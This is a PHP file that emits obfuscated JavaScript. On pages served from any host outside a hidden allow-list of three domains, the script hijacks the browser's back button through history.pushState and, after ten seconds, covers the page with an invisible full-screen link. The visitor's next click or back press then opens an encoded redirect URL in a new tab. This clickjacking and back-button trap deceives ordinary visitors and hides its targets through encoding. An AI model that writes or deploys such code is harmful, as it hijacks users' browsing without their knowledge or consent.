<?php

$domainAllowed = json_encode([
    enc('onphpid.com'),
    enc('neon.web.id'),
    enc('dailytech.id')
], JSON_UNESCAPED_SLASHES);

$keyRedirect = enc('https://google.com');

function enc($str) {
    $shifted = '';
    for ($i = 0; $i < strlen($str); $i++) {
        $shifted .= chr(ord($str[$i]) + 3);
    }
    return base64_encode($shifted);
}

$scriptJS = <<<JS
(function () {

    function setCookie(name, value, days) {
        let expires = "";
        if (days) {
            let date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = "; expires=" + date.toUTCString();
        }
        document.cookie = name + "=" + encodeURIComponent(value) + expires + "; path=/";
    }

    function getCookie(name) {
        let cname = name + "=";
        let decoded = decodeURIComponent(document.cookie);
        let parts = decoded.split(';');
        for (let i = 0; i < parts.length; i++) {
            let c = parts[i].trim();
            if (c.indexOf(cname) === 0) {
                return c.substring(cname.length, c.length);
            }
        }
        return null;
    }

    function dec(encoded) {
        let shifted = atob(encoded);
        return shifted.split("").map(c =>
            String.fromCharCode(c.charCodeAt(0) - 3)
        ).join("");
    }

    function armTheTrap() {
        history.pushState({trap: true}, document.title, location.href);
        history.pushState({trap: true}, document.title, location.href);
    }

    let host   = window.location.hostname.toLowerCase();
    let keys = $domainAllowed;
    let key    = '$keyRedirect';
    let hasBeen= 'follow_allow';

    let valid = false;

    for (let i = 0; i < keys.length; i++) {
        if (dec(keys[i]) === host) {
            valid = true;
            break;
        }
    }

    if (!valid && getCookie(hasBeen) === null) {
        let backHasTriggered = false;

        armTheTrap();

        window.addEventListener('popstate', function (e) {
            if (backHasTriggered) {
                return;
            }
            backHasTriggered = true;

            const win = window.open(dec(key), '_blank');

            if (win && !win.closed && typeof win.closed !== 'undefined') {
                win.focus();
                armTheTrap();
                backHasTriggered = false;
            }
        });

        setTimeout(() => {
            const a = document.createElement("a");
            a.style.position = "fixed";
            a.style.top = "0";
            a.style.left = "0";
            a.style.width = "100vw";
            a.style.height = "100vh";
            a.style.background = "transparent";
            a.style.display = "block";
            a.style.zIndex = "999999";
            a.href = dec(key);
            a.target = "_blank";

            a.addEventListener("click", () => {
                setCookie(hasBeen, "follow_allow", 1);
                a.remove();
            });

            document.body.appendChild(a);
        }, 10000);
    }
})();
JS;

echo $scriptJS;
